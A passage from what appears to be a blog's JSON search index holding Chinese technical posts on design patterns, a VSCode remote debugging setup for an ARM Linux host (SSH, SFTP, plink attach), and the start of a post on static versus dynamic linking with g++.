title=\"迭代器(Iterator)\"></a>迭代器(Iterator)</h2><p>迭代器是一个行为模式，提供一种序列化访问聚合元素而不暴露底层结构的行为。</p>\n<p>聚合是不变的，但是遍历的机制是变化的。比如，增加一个过滤算法，聚合的接口应该要为新的方法修改。迭代器做到让遍历和容器本身解耦。</p>\n<h3 id=\"结构\"><a href=\"#结构\" class=\"headerlink\" title=\"结构\"></a>结构</h3><p><img src=\"Screenshot_20181122_152015.png\" alt=\"\"></p>\n<h3 id=\"实现-3\"><a href=\"#实现-3\" class=\"headerlink\" title=\"实现\"></a>实现</h3><ul>\n<li>Public，破坏封装性，但是可以存储多个对象的游标</li>\n<li>Private内部类，定义在聚合类中，保护封装性</li>\n</ul>\n<p>外部迭代器：<br><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">List&lt;String&gt; s = Arrays.asList(<span class=\"keyword\">new</span> String[]&#123;<span class=\"string\">&quot;A&quot;</span>,<span class=\"string\">&quot;B&quot;</span>,<span class=\"string\">&quot;C&quot;</span>,<span class=\"string\">&quot;D&quot;</span>&#125;);</span><br><span class=\"line\">Iterator&lt;String&gt; iter = s.listIterator();</span><br><span class=\"line\"><span class=\"keyword\">while</span>(iter.hasNext()) &#123;</span><br><span class=\"line\">    System.out.println(iter.next());</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>内部迭代器：<br><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">s.forEach(name -&gt; System.out.println(name))</span><br></pre></td></tr></table></figure></p>\n<p>当迭代器遍历的时候，修改一个聚合会很危险：</p>\n<ul>\n<li>要么拷贝一份聚合，然后遍历拷贝，但是代价很大</li>\n<li>每次增删，聚合自己改变自己迭代器的状态</li>\n</ul>\n<p>静态迭代器：在创建时会拷贝一份聚合，在遍历时聚合的变化不影响<br>动态迭代器：动态迭代器是和静态迭代器相反，遍历的时候聚合的变化是允许的。（难以实现）</p>\n<p>迭代器必须实现的操作：<code>first</code>，<code>Next</code>，<code>isDone</code>，<code>currentItem</code>,还有一些额外有用的操作：<code>first</code>，<code>last</code>，<code>prev</code>，<code>skipTo</code>。一般的迭代器遍历所有元素，而过滤迭代器只遍历满足条件的元素。</p>\n<p>空迭代器：</p>\n<ul>\n<li>一个空迭代器是迭代器的退化版本，用于处理边界问题</li>\n<li>通过定义，一个空迭代器的遍历总是完成的，IsDone方法总是为true</li>\n<li>空迭代器可以让遍历树状的的聚合更加方便（比如组合）</li>\n</ul>\n<p>java5之后for循环中的迭代器：<br><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">for</span>(Object obj:collection) &#123;</span><br><span class=\"line\">    ...</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"组合-Composite\"><a href=\"#组合-Composite\" class=\"headerlink\" title=\"组合(Composite)\"></a>组合(Composite)</h2><p>组合是一种结构模型，树状结构的对象 类似数据结构中的List</p>\n<p><img src=\"Screenshot_20181126_141835.png\" alt=\"\"></p>\n<p>叶子和结点都实现component抽象类，当父结点获得请求，会传给孩子，一个个向下传。对于无法实现的方法，抛出异常即可。</p>\n<p>这种结构下访问父结点困难，可以额外在componet中构建父指针。</p>\n<p>用途中缀表达式求值 awt</p>\n<h2 id=\"状态-state\"><a href=\"#状态-state\" class=\"headerlink\" title=\"状态(state)\"></a>状态(state)</h2><p>状态模式是一种行为模式。</p>\n<p>状态模式允许一个对象在其内部状态改变的时候改变其行为。这个对象看上去就像改变了它的类一样。</p>\n<p><img src=\"Screenshot_20181126_150804.png\" alt=\"\"></p>\n<p>使用聚合+继承实现，方便扩展。Context是唯一暴露给客户的的类，state是具体状态的抽象</p>\n<h3 id=\"关于状态类的初始化\"><a href=\"#关于状态类的初始化\" class=\"headerlink\" title=\"关于状态类的初始化\"></a>关于状态类的初始化</h3><p>Lazy:只在具体的状态类必须时创建，不用就可以销毁<br>Eager:提前创建，并且不析构</p>\n<h3 id=\"扩展\"><a href=\"#扩展\" class=\"headerlink\" title=\"扩展\"></a>扩展</h3><p>可以建立一个表，来映射输入和具体的类，这样可以在运行时修改数据改变规则，而不是修改代码。</p>\n<h2 id=\"代理-proxy\"><a href=\"#代理-proxy\" class=\"headerlink\" title=\"代理(proxy)\"></a>代理(proxy)</h2><p>代理是一种结构模式</p>\n<p>代理模式给某一个对象提供一个代理对象，并由代理对象控制对原对象的引用。</p>\n<p>例如。在动态服务器连续的接受类似的请求时，会浪费资源对单一重复html对象多次渲染，一种解决方法就是使用一个代理类，代替目标类，只在必要时要求目标类重新渲染。</p>\n<p>比如，一个图像代理类，只有在文档要求他显示的时候，才会从磁盘上加载图像</p>\n<p><img src=\"Screenshot_20181126_155735.png\" alt=\"\"></p>\n<h2 id=\"享元-Flyweight\"><a href=\"#享元-Flyweight\" class=\"headerlink\" title=\"享元(Flyweight)*\"></a>享元(Flyweight)*</h2><p>结构化模式，共享元素，避免浪费。Flyweight means “次最轻量级的拳击选手”</p>\n<p>享元模式以共享的方式高效地支持大量的细粒度对象)“通过尽量共享实例来避免new出实例(new不仅消耗内存，还会花费时间)</p>\n<p><img src=\"Screenshot_20181129_163426.png\" alt=\"\"></p>\n<h2 id=\"建造者-builder\"><a href=\"#建造者-builder\" class=\"headerlink\" title=\"建造者(builder)\"></a>建造者(builder)</h2><p>用于组装复杂实例的创建模式</p>\n<ul>\n<li>Build：英文的意思是建造和构建具有建筑结构的大型物体。</li>\n<li>建造大楼时：打牢地基、搭建框架、然后自下而上一层层盖起来。通常需要先建造组成这个物体的各个部分，然后分阶段把它们组装起来</li>\n</ul>\n<p>建造者模式将产品的结构和产品的零件建造过程对客户端隐藏起来，把对建造过程进行指挥的责任和具体建造者零件的责任分割开来，达到责任划分和封装的目的。</p>\n<p><img src=\"Screenshot_20181129_152039.png\" alt=\"\"><br><img src=\"Screenshot_20181129_152213.png\" alt=\"\"></p>\n<p>建造模式和模板方法模式的区别：建造模式是为了构造，模板方法用的继承。模板方法超类控制约束方法的顺序；建造模式基于聚合</p>\n<h2 id=\"责任链-chain-of-responsibility\"><a href=\"#责任链-chain-of-responsibility\" class=\"headerlink\" title=\"责任链(chain of responsibility)\"></a>责任链(chain of responsibility)</h2><p>什么是“推卸责任”？</p>\n<ul>\n<li>坏的方面：e.g., 去办事，被不同部门踢皮球。</li>\n<li>好的方面：e.g., 当外部请求程序进行某个处理，但程序暂时无法直接决定由哪个对象负责处理时，就需要推卸责任。我们可以将多个对象组成一个职责链，然后按照它们在职责链上的顺序一个一个地找出谁来负责处理。</li>\n</ul>\n<p>责任链部门：对于一个请求，能自己做就自己做，做不了就推卸给下一个人；下一个人能自己做就自己做，不能做再推卸给下一个人。</p>\n<ul>\n<li>缺点：延迟</li>\n<li>优点：解耦（发送者甚至不知道应该谁是接受者）</li>\n</ul>\n<h3 id=\"目的\"><a href=\"#目的\" class=\"headerlink\" title=\"目的\"></a>目的</h3><p>避免了一个发送者固定一个接受者造成的耦合，让一个请求得到多次被传播的机会直到被处理。<br>例子：GUI中组建的焦点pass</p>\n<h3 id=\"结构-1\"><a href=\"#结构-1\" class=\"headerlink\" title=\"结构\"></a>结构</h3><p><img src=\"Screenshot_20181129_162957.png\" alt=\"\"><br>每一个handler‘持有’另一个handler的引用，做请求的传递</p>\n<p>存在一个请求到达最后依然没有被解决的可能。</p>\n<h2 id=\"中介者-调停者-Mediator\"><a href=\"#中介者-调停者-Mediator\" class=\"headerlink\" title=\"中介者/调停者(Mediator)*\"></a>中介者/调停者(Mediator)*</h2><p>中介者/调停者是一种行为模式。</p>\n<p>中介者/调停者对象封装了一系列对象相互作用的方式，使得这些对象不必互相明显引用。从而使它们可以较松散地耦合。当这些对象中的某些对象之间的相互作用发生改变时，不会立即影响到其他的一些对象之间的相互作用。从而保证这些相互作用可以彼此独立地变化。</p>\n<h2 id=\"桥接-Bridge\"><a href=\"#桥接-Bridge\" class=\"headerlink\" title=\"桥接(Bridge)*\"></a>桥接(Bridge)*</h2><p>希望增加新功能时</p>\n<ul>\n<li>类的功能层次结构<ul>\n<li>父类具有基本功能</li>\n<li>在子类中增加新的功能</li>\n</ul>\n</li>\n<li>当需要增加新功能时，我们可以从各个层次的类中找到最符合自己需求的类，然后以它为父类编写子类，并在子类中增加新的功能。</li>\n<li><p>希望增加新的实现时</p>\n<ul>\n<li>类的实现层次结构</li>\n<li>父类通过声明抽象方法定义接口</li>\n<li>子类通过实现具体方法来实现接口</li>\n</ul>\n</li>\n<li><p>当类的层次结构只有一层时，功能层次结构与实现结构是混杂在一个层次结构中的。这使得类层次结构变的复杂，也很难确定究竟该在类的哪一个层次结构中去增加子类。</p>\n</li>\n<li><p>需要将“类的功能层次结构”和“类的实现层次结构”分离为两个独立的类层次结构。然后在它们之间搭建一座bridge。</p>\n</li>\n<li><p>(桥接模式的用意是将抽象与实现解耦，使得二者可以独立地变化。)</p>\n</li>\n<li>抽象(Abstraction)不等于接口(Interface)，存在于多个实体中的共同的概念性联系，就是抽象。接口是一种抽<br>象的方式。</li>\n<li>所谓强耦和，就是在编译时期已经确定的，无法在运行时期动态改变的关联；所谓弱耦和，就是可以动态地确定并且可以在运行时期动态地改变的关联。</li>\n</ul>\n<p><img src=\"Screenshot_20181203_150252\" alt=\"\"></p>\n<h2 id=\"原型-ProtoType\"><a href=\"#原型-ProtoType\" class=\"headerlink\" title=\"原型(ProtoType)\"></a>原型(ProtoType)</h2><h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"#\"></a>#</h2><p>使用原型实例指定要创建的对象类型，并通过复制此原型来创建新对象。</p>\n<p><img src=\"Screenshot_20181203_153038.png\" alt=\"\"></p>\n<p>客户要求ProtoType克隆自己</p>\n<ul>\n<li>优点：<ul>\n<li>一些情况工厂和建造模式也具有</li>\n<li>在运行时增删产品</li>\n<li>减少了创建器的结构</li>\n</ul>\n</li>\n<li>缺点：<ul>\n<li>所有子类必须实现克隆操作</li>\n</ul>\n</li>\n</ul>\n<p>java.Object的<code>clone()</code>方法执行的是一种浅复制，即：被复制的对象中指向的其他对象不会被复制实例，只会复制引用。</p>\n<p>类似工厂方法，但不完全是，这种是用于复制一个备份，而且是可以保留状态的复制。</p>\n<h2 id=\"备忘录-Memento\"><a href=\"#备忘录-Memento\" class=\"headerlink\" title=\"备忘录(Memento)*\"></a>备忘录(Memento)*</h2><p>备忘录是一种行为模式</p>\n<h3 id=\"目的-1\"><a href=\"#目的-1\" class=\"headerlink\" title=\"目的\"></a>目的</h3><p>在<strong>不破坏封装</strong>的条件下，将一个对象的状态捕捉住，并外部化，存储起来，从而可以在将来合适的时候把这个对象还原到存储起来的状态。(对象的持久化，游戏存档)</p>\n<h3 id=\"实现-4\"><a href=\"#实现-4\" class=\"headerlink\" title=\"实现\"></a>实现</h3><p>要在不破坏封装的情况下获取状态和恢复状态<br><img src=\"Screenshot_20181203_154740.png\" alt=\"\"></p>\n<p>协作过程：<br><img src=\"Screenshot_20181206_140834.png\" alt=\"\"></p>\n<h3 id=\"缺点-1\"><a href=\"#缺点-1\" class=\"headerlink\" title=\"缺点\"></a>缺点</h3><p>代价会很大。如果Originator必须复制大量信息以存储在Memento中，或者如果client经常创建并将Memento返回originate，那么Mementos可能会产生相当大的开销。</p>\n<h2 id=\"访问者-Visitor\"><a href=\"#访问者-Visitor\" class=\"headerlink\" title=\"访问者(Visitor)*\"></a>访问者(Visitor)*</h2><p>访问者是一种行为模式.表示要对对象结构的元素执行的操作。访问者允许您定义新操作，而无需更改其操作的元素的类</p>\n<p>对象结构包含许多具有不同接口的对象类，并且您希望对依赖于其具体类的这些对象执行操作。</p>\n<p>需要对对象结构中的对象执行许多不同且不相关的操作，并且您希望避免使用这些操作“污染”它们的类。 当许多应用程序共享对象结构时，使用Visitor将操作放在那些需要它们的应用程序中。</p>\n<p>定义对象结构的类很少改变，但是您经常希望在结构上定义新的操作<br><img src=\"Screenshot_20181206_163545.png\" alt=\"\"></p>\n<p>最典型的：文件系统的遍历</p>\n<h2 id=\"解释器-Interpreter\"><a href=\"#解释器-Interpreter\" class=\"headerlink\" title=\"解释器(Interpreter)\"></a>解释器(Interpreter)</h2><p>解释器是一种行为模式，给定一个语言之后，解释器模式可以定义出其文法的一种表示，并同时提供一个解释器。客户端可以使用这个解释器来解释这个语言中的句子。</p>\n<p><img src=\"Screenshot_20181206_160347.png\" alt=\"\"></p>\n<p>当存在要解释的语言时，请使用解释器模式，并且可以将语言中的语句表示为抽象语法树（抽象语法树）。这种模式下在<strong>语法简单时时候</strong>表现很好，不要考虑性能的问题。一般需要考虑到性能的时候，解释器通常不是用树状结构表示而是直接把他们翻译成另一种形式（四元式）。</p>\n<p><img src=\"Screenshot_20181206_160740.png\" alt=\"\"></p>\n<ul>\n<li>AbstractExpression:申明一个适用于所有节点的抽象解释方法</li>\n<li>TerminalExpression：申明一个关联终结符的解释器</li>\n<li><p>NonTerminalExpression: 声明一个关联非终结符的解释器,迭代解释</p>\n</li>\n<li><p>客户端将句子构建为抽象语法树NonterminalExpression和TerminalExpression实例。 </p>\n</li>\n<li>然后客户端初始化上下文和调用Interpret操作。</li>\n<li>每个NonterminalExpression节点根据每个子表达式的解释定义解释。</li>\n<li>每个TerminalExpression的Interpret操作定义递归中的基本情况。</li>\n<li>每个节点的解释操作使用上下文存储并访问解释器的状态</li>\n</ul>\n<p>这种一个符号一个instance的设计，很容易实现和维护和扩展，因为这种模式用类来表示语法规则。复杂的语法很难维护，Interpreter模式为语法中的每个规则定义至少一个类。因此，包含许多规则的语法可能难以管理和维护。</p>\n","tags":["设计模式"]},{"title":"远程调试环境搭建","url":"/2022/07/02/%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/","content":"<blockquote>\n<p>由于平时一直使用Arch Linux环境写代码，但是公司只给用Windows，对Windows MinGW开发环境的场景觉得很不顺手。由于业务是Linux业务，在本地开发无法编译，需要使用远程编译机编译。这种模式使得调试程序只能远端编译后，在远端不使用GDB，而GDB命令行不仅难用还有高昂的学习成本。最近新发现一写远程开发/调试的方案，再次整理出来以应付C++跨平台开发的场景。</p>\n</blockquote>\n<h2 id=\"创建样例程序\"><a href=\"#创建样例程序\" class=\"headerlink\" title=\"创建样例程序\"></a>创建样例程序</h2><ul>\n<li>本机环境：Windows X64</li>\n<li>远端环境：Linux（Armbian）aarch64</li>\n<li>本地IDE: VSCode<br>创建一个CMake项目用于演示：<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">.</span><br><span class=\"line\">├── build/</span><br><span class=\"line\">├── CMakeLists.txt</span><br><span class=\"line\">├── include/</span><br><span class=\"line\">│   └── Student.h</span><br><span class=\"line\">└── src/</span><br><span class=\"line\">    ├── main.cpp</span><br><span class=\"line\">    └── Student.cpp</span><br></pre></td></tr></table></figure>\n<span id=\"more\"></span>\n</li>\n</ul>\n<h3 id=\"基于SSH远程开发\"><a href=\"#基于SSH远程开发\" class=\"headerlink\" title=\"基于SSH远程开发\"></a>基于SSH远程开发</h3><p>第一种方案就是使用Remote-Develop套件：它包含：</p>\n<ul>\n<li>Remote-SSH 用于SSH链接到远端环境开发/调试</li>\n<li>Remote-Container 用于链接到容器开发/调试</li>\n<li>Remote-WSL 用于链接到WSL开发/调试</li>\n</ul>\n<p><img src=\"Screenshot 2022-07-03 143024.png\" alt=\"\"></p>\n<p>远端开发相当把整个工作环境搬到远端，项目在远端，编译调试也在远端，VSCode只充当一个VNC的角色。此时在VSCode上开发就好似拥有了一台本地ARM开发环境一样。</p>\n<pre class=\"mermaid\">flowchart LR;\n    subgraph Host [Host ARM Enviroment]\n        remote_extension(Remote VSCode Extension) --control--> compiler\n        remote_extension --control--> debugger\n        remote_extension --edit--> project_source\n        compiler(Compiler) --compile--> project_source\n        project_source(Project Source) --> ELF[(Project Release ELF)]\n        debugger(Debugger) --debug---> ELF\n    end\n    subgraph Local [Local]\n      vscode(Local VSCode IDE)\n    end\n    remote_extension <-.SSH.-> vscode</pre>\n\n<ol>\n<li><p>第一步需要添加远端环境，配置IP，用户名，密码<br><img src=\"Screenshot 2022-07-03 143213.png\" alt=\"\"></p>\n</li>\n<li><p>配置完成后将项目上传到远端环境，VSCode打开远端目录。此时项目可以看到提示环境已经切换到远端，编译器已经切换为arm的编译器，项目目录提示这是远端目录。<br><img src=\"Screenshot 2022-07-03 142309.png\" alt=\"\"></p>\n</li>\n<li><p>由于是完全在远端开发，在远端环境需要重新安装项目相关的插件，点击按钮同步本地插件。<br><img src=\"Screenshot 2022-07-03 142404.png\" alt=\"\"></p>\n</li>\n<li><p>配置远端<code>launch.json</code>和本地版本无异：</p>\n<figure class=\"highlight json\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"attr\">&quot;configurations&quot;</span>: [</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"attr\">&quot;name&quot;</span>: <span class=\"string\">&quot;Remote Dev&quot;</span>,</span><br><span class=\"line\">      <span class=\"attr\">&quot;request&quot;</span>: <span class=\"string\">&quot;launch&quot;</span>,</span><br><span class=\"line\">      <span class=\"attr\">&quot;type&quot;</span>: <span class=\"string\">&quot;cppdbg&quot;</span>,</span><br><span class=\"line\">      <span class=\"attr\">&quot;cwd&quot;</span>: <span class=\"string\">&quot;$&#123;fileDirname&#125;&quot;</span>,</span><br><span class=\"line\">      <span class=\"attr\">&quot;program&quot;</span>: <span class=\"string\">&quot;/home/xuranus/workspace/Demo/build/demo&quot;</span>,</span><br><span class=\"line\">      <span class=\"attr\">&quot;args&quot;</span>: [],</span><br><span class=\"line\">      <span class=\"attr\">&quot;stopAtEntry&quot;</span>: <span class=\"literal\">false</span>,</span><br><span class=\"line\">      <span class=\"attr\">&quot;environment&quot;</span>: [],</span><br><span class=\"line\">      <span class=\"attr\">&quot;externalConsole&quot;</span>: <span class=\"literal\">false</span>,</span><br><span class=\"line\">      <span class=\"attr\">&quot;MIMode&quot;</span>: <span class=\"string\">&quot;gdb&quot;</span>,</span><br><span class=\"line\">      <span class=\"attr\">&quot;miDebuggerPath&quot;</span>: <span class=\"string\">&quot;/usr/bin/gdb&quot;</span>,</span><br><span class=\"line\">      <span class=\"attr\">&quot;setupCommands&quot;</span>: [</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          <span class=\"attr\">&quot;description&quot;</span>: <span class=\"string\">&quot;enable pretty print for gdb&quot;</span>,</span><br><span class=\"line\">          <span class=\"attr\">&quot;text&quot;</span>: <span class=\"string\">&quot;-enable-pretty-print&quot;</span>,</span><br><span class=\"line\">          <span class=\"attr\">&quot;ignoreFailures&quot;</span>: <span class=\"literal\">true</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">      ],</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  ]</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n</li>\n</ol>\n<p>这种开发模式是完全基于远端的，文件全部存在远端，每次修改代码直接在远端修改，网络延迟很大决定了实际的开发体验，建议在网络较好的内网环境下使用。远端开发需要在远端上安装VSCode插件，可能会污染远端环境。</p>\n<h3 id=\"远程编译，Attach调试\"><a href=\"#远程编译，Attach调试\" class=\"headerlink\" title=\"远程编译，Attach调试\"></a>远程编译，Attach调试</h3><p>还有一种方式就是利用管道程序，Attach远端进程调试。这种方式在本地开发，远端编译，远端运行。与之前不同的是：项目存放在本地。需要将本地文件与远端文件同步，手动编译远端文件，启动远端进程，再Attach远端进程并在本地调试。</p>\n<pre class=\"mermaid\">flowchart LR;\n    subgraph Local [Local X86 Enviroment]\n        vscode(VSCode IDE) <--> plink\n        plink(plink.exe)\n    end\n    subgraph Remote [Remote ARM Enviroment]\n        compiler(Compiler) --compile --> project_source(Project Source)\n        project_source --> ELF[(Project Release ELF)] \n        debugger(Debugger) --debug--> Process\n        ELF --run--> Process((Process))\n    end\n    plink <-.SSH.-> Process\n    vscode -.SFTP.-> project_source</pre>\n\n<ol>\n<li><p>首先需要下载一个本地管道程序，它用于SSH链接到远端，Attach一个远端进程，在本地调试远端程序。建议使用Putty的<a href=\"https://www.putty.be/latest.html\">plink</a>作为管道程序。</p>\n</li>\n<li><p>本地安装SFTP插件。<br><img src=\"Screenshot 2022-07-03 142431.png\" alt=\"\"></p>\n</li>\n</ol>\n<p>SFTP是一个用于同步本地和远程目录的基于SSH的插件，首次使用时需要先配置，F1使用<code>SFTP Sync: Local -&gt; Remote</code>将本地目录上传到远端。之后每次保存文件时，插件都会自动同步该文件。</p>\n<p>配置SFTP <code>sftp.json</code><br><figure class=\"highlight json\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"attr\">&quot;name&quot;</span>: <span class=\"string\">&quot;My Remote ARM Compiler&quot;</span>,</span><br><span class=\"line\">    <span class=\"attr\">&quot;host&quot;</span>: <span class=\"string\">&quot;192.168.100.1&quot;</span>,</span><br><span class=\"line\">    <span class=\"attr\">&quot;protocol&quot;</span>: <span class=\"string\">&quot;sftp&quot;</span>,</span><br><span class=\"line\">    <span class=\"attr\">&quot;password&quot;</span>: <span class=\"string\">&quot;**********&quot;</span>,</span><br><span class=\"line\">    <span class=\"attr\">&quot;port&quot;</span>: <span class=\"number\">22</span>,</span><br><span class=\"line\">    <span class=\"attr\">&quot;username&quot;</span>: <span class=\"string\">&quot;xuranus&quot;</span>,</span><br><span class=\"line\">    <span class=\"attr\">&quot;remotePath&quot;</span>: <span class=\"string\">&quot;/home/xuranus/workspace/Demo&quot;</span>,</span><br><span class=\"line\">    <span class=\"attr\">&quot;uploadOnSave&quot;</span>: <span class=\"literal\">true</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><br><img src=\"Screenshot 2022-07-03 143256.png\" alt=\"\"></p>\n<ol>\n<li>配置<code>launch.json</code><figure class=\"highlight json\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"attr\">&quot;configurations&quot;</span>: [</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"attr\">&quot;name&quot;</span>: <span class=\"string\">&quot;GDB Remote Attach&quot;</span>,</span><br><span class=\"line\">      <span class=\"attr\">&quot;request&quot;</span>: <span class=\"string\">&quot;attach&quot;</span>,</span><br><span class=\"line\">      <span class=\"attr\">&quot;type&quot;</span>: <span class=\"string\">&quot;cppdbg&quot;</span>,</span><br><span class=\"line\">      <span class=\"attr\">&quot;processId&quot;</span>:<span class=\"string\">&quot;$&#123;command:pickRemoteProcess&#125;&quot;</span>,</span><br><span class=\"line\">      <span class=\"attr\">&quot;cwd&quot;</span>: <span class=\"string\">&quot;$&#123;workspaceFolder&#125;&quot;</span>,</span><br><span class=\"line\">      <span class=\"attr\">&quot;program&quot;</span>: <span class=\"string\">&quot;/home/xuranus/workspace/Demo/build/demo&quot;</span>,</span><br><span class=\"line\">      <span class=\"attr\">&quot;args&quot;</span>: [],</span><br><span class=\"line\">      <span class=\"attr\">&quot;stopAtEntry&quot;</span>: <span class=\"literal\">true</span>,</span><br><span class=\"line\">      <span class=\"attr\">&quot;sourceFileMap&quot;</span>: &#123;</span><br><span class=\"line\">        <span class=\"attr\">&quot;/home/xuranus/workspace/Demo&quot;</span>: <span class=\"string\">&quot;C:\\\\Users\\\\XUranus\\\\Desktop\\\\Demo&quot;</span></span><br><span class=\"line\">      &#125;,</span><br><span class=\"line\">      <span class=\"attr\">&quot;environment&quot;</span>: [],</span><br><span class=\"line\">      <span class=\"attr\">&quot;externalConsole&quot;</span>: <span class=\"literal\">false</span>,</span><br><span class=\"line\">      <span class=\"attr\">&quot;MIMode&quot;</span>: <span class=\"string\">&quot;gdb&quot;</span>,</span><br><span class=\"line\">      <span class=\"attr\">&quot;miDebuggerPath&quot;</span>: <span class=\"string\">&quot;/usr/bin/gdb&quot;</span>,</span><br><span class=\"line\">      <span class=\"attr\">&quot;setupCommands&quot;</span>: [</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          <span class=\"attr\">&quot;description&quot;</span>: <span class=\"string\">&quot;enable pretty print for gdb&quot;</span>,</span><br><span class=\"line\">          <span class=\"attr\">&quot;text&quot;</span>: <span class=\"string\">&quot;-enable-pretty-print&quot;</span>,</span><br><span class=\"line\">          <span class=\"attr\">&quot;ignoreFailures&quot;</span>: <span class=\"literal\">true</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">      ],</span><br><span class=\"line\">      <span class=\"attr\">&quot;pipeTransport&quot;</span>: &#123;</span><br><span class=\"line\">        <span class=\"attr\">&quot;pipeCwd&quot;</span>: <span class=\"string\">&quot;&quot;</span>,</span><br><span class=\"line\">        <span class=\"attr\">&quot;pipeProgram&quot;</span>: <span class=\"string\">&quot;C:\\\\Users\\\\XUranus\\\\Downloads\\\\plink.exe&quot;</span>,</span><br><span class=\"line\">        <span class=\"attr\">&quot;pipeArgs&quot;</span>: [<span class=\"string\">&quot;-ssh&quot;</span>, <span class=\"string\">&quot;root@192.168.1.6&quot;</span>, <span class=\"string\">&quot;-pw&quot;</span>, <span class=\"string\">&quot;********&quot;</span>],</span><br><span class=\"line\">        <span class=\"attr\">&quot;debuggerPath&quot;</span>: <span class=\"string\">&quot;/usr/bin/gdb&quot;</span></span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  ]</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n其中要注意的是：<ul>\n<li><code>sourceFileMap</code> 配置本地文件目录和远端目录的映射关系，用于打断点</li>\n<li><code>processId</code> 配置<code>&quot;$&#123;command:pickRemoteProcess&#125;&quot;</code>，在每次debug时手动选择远端要被Attach的进程</li>\n<li><code>request</code> 需要为<code>attach</code>，意味着附带Debug远端进程</li>\n</ul>\n</li>\n</ol>\n<p>由于每次启动本地plink attach debug必须让远端进程先跑起来才能选择remote的进程号，我解决方案是在程序入口<code>sleep</code>一段时间，在这个时间段内启动本地plink attach debug。虽然觉得这个方案比较蠢，但是目前没有想到更好的解决办法。</p>\n","tags":["CPP"]},{"title":"静态链接库与动态链接库","url":"/2021/06/22/%E9%9D%99%E6%80%81%E9%93%BE%E6%8E%A5%E5%BA%93%E4%B8%8E%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E5%BA%93/","content":"<h2 id=\"背景\"><a href=\"#背景\" class=\"headerlink\" title=\"背景\"></a>背景</h2><p>我写了一个矩阵的基本运算库，头文件<code>matrix.h</code>中是<code>class matrix</code>成员变量和方法的声明，方法的具体实现放在<code>matrix.cpp</code>中。在<code>main.cpp</code>中<code>#include &lt;matrix.h&gt;</code>调用库文件。</p>\n<p>以往要编译这种文件的时候，往往都是<code>g++ matrix.cpp main.cpp -o main</code>直接生成一个<code>main</code>可执行文件。如果项目还有还多其他的依赖呢？继续把全部代码打包成一个很大的可执行文件吗？如果日后很多程序都复用这个模块，是否会存储和加载冗余的代码？</p>\n<span id=\"more\"></span>\n<h2 id=\"静态链接与动态链接\"><a href=\"#静态链接与动态链接\" class=\"headerlink\" title=\"静态链接与动态链接\"></a>静态链接与动态链接</h2><p>首先我们从C++的编译过程入手，一般一个C++程序被编译的过程分几步：预编译，编译，汇编，链接。</p>\n<p><code>g++ -c matrix.cpp -o matrix.o</code>通过制定<code>-c</code>参数，告诉编译器只编译<code>matrix.cpp</code>，但不要链接，而生成的<code>matrix.o</code>文件称为<strong>对象文件（object file)</strong>（如果不指定<code>-o</code>输出文件，默认输出<code>cpp</code>文件同名的<code>*.o</code>文件）。这条命令完成了链接之前的全部过程：编译和汇编。接下来可以将汇编生成的二进制对象文件<code>matrix.o</code>和库一起链接，打包成可执行文件<code>main</code>：</p>\n<blockquote>\n<p>msvc下对象文件为*.obj</p>\n</blockquote>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">g++ main.cpp matrix.o -o main</span><br></pre></td></tr></table></figure>\n<p>或者：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">g++ -c main.cpp -o main.o</span><br><span class=\"line\">g++ main.o matrix.o -o main</span><br></pre></td></tr></table></figure>\n<p>在不指定<code>-c</code>参数的时候，<code>g++</code>会自动识别参数中的文件类型并可执行文件。</p>\n<p>这种过程生成和直接<code>g++ main.cpp matrix.cpp -o main</code>的构建过程等价。在<strong>编译期链接阶段</strong>生成的对象文件（<em>.o）需要和相关函数库链接，形成一个可执行文件。程序在执行时，直接从该文件加载相关库，这种链接方式叫做<em>*静态链接</em></em>。</p>\n<p>如果把一些库<strong>函数的链接过程推迟到运行时进行</strong>，这就是动态链接，参与链接的库被成为<strong>动态链接库（dynamic link library）</strong>，在Windows下动态链接库文件表现为<code>*.dll</code>的形式，在Linux下只是<code>*.so</code></p>\n<h2 id=\"静态链接库\"><a href=\"#静态链接库\" class=\"headerlink\" title=\"静态链接库\"></a>静态链接库</h2><p>静态连接过程中使用的相关的函数库被称作是<strong>静态链接库（static library）</strong>，在Windows下常常以<code>*.lib</code>文件出现，在Linux下是<code>*.a</code>文件。</p>\n<p>静态链接库同是经过汇编后的二进制文件，内容上和对象文件相似，可以看成是一组目标文件(<em>.o / </em>.obj文件)的压缩打包后的集合。</p>\n<p>同上述对象文件连接过程一样，静态链接库对函数库的链接是在编译期完成的。编译完成后，生成的程序便于静态链接库没有关系，因此移植方便。</p>\n<h3 id=\"Linux静态链接库\"><a href=\"#Linux静态链接库\" class=\"headerlink\" 